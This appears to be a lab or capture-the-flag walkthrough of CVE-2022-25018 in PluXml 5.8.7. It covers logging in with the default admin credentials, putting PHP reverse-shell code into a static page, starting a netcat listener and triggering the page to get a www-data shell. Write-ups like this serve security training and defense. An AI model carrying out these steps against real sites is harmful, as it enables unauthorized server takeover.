# PluXml

PluXml is an XML-powered blog and CMS. PluXml `5.8.7` allowed an authenticated manager to place PHP code in a static page and execute it through the page's public route.

## Discovery

Nmap and web fingerprinting identified the CMS on Apache:

```bash
nmap -sC -sV -p- TARGET -oA nmap/nmap.full
whatweb http://TARGET
```

Observed indicators:

```text
80/tcp open  http  Apache httpd 2.4.56 ((Debian))
|_http-title: PluXml - Blog or CMS, XML powered !
```

```text
Cookies[PHPSESSID]
Title[PluXml - Blog or CMS, XML powered !]
```

HTTP enumeration exposed useful application directories:

```text
/core/
/data/
/themes/
```

The public page included an administrator link leading to:

```text
/core/admin/auth.php?p=/core/admin/
```

## Authentication and Version

The default credentials successfully authenticated:

```text
admin:admin
```

The authenticated administration interface disclosed the installed version:

```text
PluXml 5.8.7
```

## CVE-2022-25018 Authenticated PHP Code Execution

Open the static-page editor after authenticating:

```text
/core/admin/statiques.php
```

Edit a static page, replace its existing content with PHP code, and save it. A PHP reverse shell can be used as the page content after setting the attacker IP address and port.

Start the listener:

```bash
nc -nlvp PORT
```

Trigger the stored PHP through the static page's public route:

```text
http://TARGET/index.php?static1/static-1
```

Successful execution returned a shell as the web-service account:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## References

- https://github.com/advisories/GHSA-mc3j-r9qr-6vgv
- https://github.com/MoritzHuppert/CVE-2022-25018/blob/main/CVE-2022-25018.pdf
